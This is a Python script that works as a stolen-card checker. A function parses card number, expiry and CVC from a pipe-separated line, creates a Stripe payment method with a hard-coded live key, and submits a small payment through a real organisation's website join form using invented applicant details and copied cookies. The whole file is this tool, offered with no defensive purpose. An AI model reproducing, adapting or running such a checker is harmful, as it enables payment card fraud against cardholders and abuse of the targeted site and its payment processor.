import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F18400c65be%3B+stripe-js-v3%2F18400c65be%3B+card-element&key=pk_live_5180TFOIbXeTntI8bkpgmycalWOYAh9jHsQkxYoLb9MAPqBy0kYdHjQGS3y4YlepY6R2lWHxcKmsl6FyAb5bjBq9N00j6BB1AEe'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'cookieyes-consent': 'consentid:QXRQNG1nYkJGUUJNY1o1dFIzNHN5c0hJa01WZm92ekE,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes',
	    '_gid': 'GA1.2.2042139903.1742727710',
	    '__stripe_mid': 'f1c99c39-79fc-490a-90a0-23c503b31b9306bb82',
	    '__stripe_sid': 'af8ac112-f02b-462d-a7c6-2e119812ab52011c6f',
	    'fluentform_step_form_hash_3': '012ba6f4-975b-4eae-9897-621d4c03d727',
	    '_ga': 'GA1.2.1463292582.1741686314',
	    '_gat_gtag_UA_8906726_2': '1',
	    '_ga_4H6B02CY8K': 'GS1.1.1742727709.2.1.1742727913.59.0.0',
	}
	
	headers = {
	    'authority': 'www.ifa.ie',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'cookieyes-consent=consentid:QXRQNG1nYkJGUUJNY1o1dFIzNHN5c0hJa01WZm92ekE,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; _gid=GA1.2.2042139903.1742727710; __stripe_mid=f1c99c39-79fc-490a-90a0-23c503b31b9306bb82; __stripe_sid=af8ac112-f02b-462d-a7c6-2e119812ab52011c6f; fluentform_step_form_hash_3=012ba6f4-975b-4eae-9897-621d4c03d727; _ga=GA1.2.1463292582.1741686314; _gat_gtag_UA_8906726_2=1; _ga_4H6B02CY8K=GS1.1.1742727709.2.1.1742727913.59.0.0',
	    'origin': 'https://www.ifa.ie',
	    'referer': 'https://www.ifa.ie/join-ifa/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1742727972042',
	}
	
	data = {
	    'data': 'item_3__fluent_sf=&__fluent_form_embded_post_id=11355&_fluentform_3_fluentformnonce=e8b7650800&_wp_http_referer=%2Fjoin-ifa%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&phone=%2B447418632703&email=rodamuser20%40gmail.com&address_1%5Baddress_line_1%5D=Street%2027&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&datetime=03-03-2001&multi_select%5B%5D=Beef&numeric_field_1=1&gdpr-agreement=on&custom-payment-amount=0.50&payment_method=stripe&input_radio=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	r2 = requests.post('https://www.ifa.ie/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
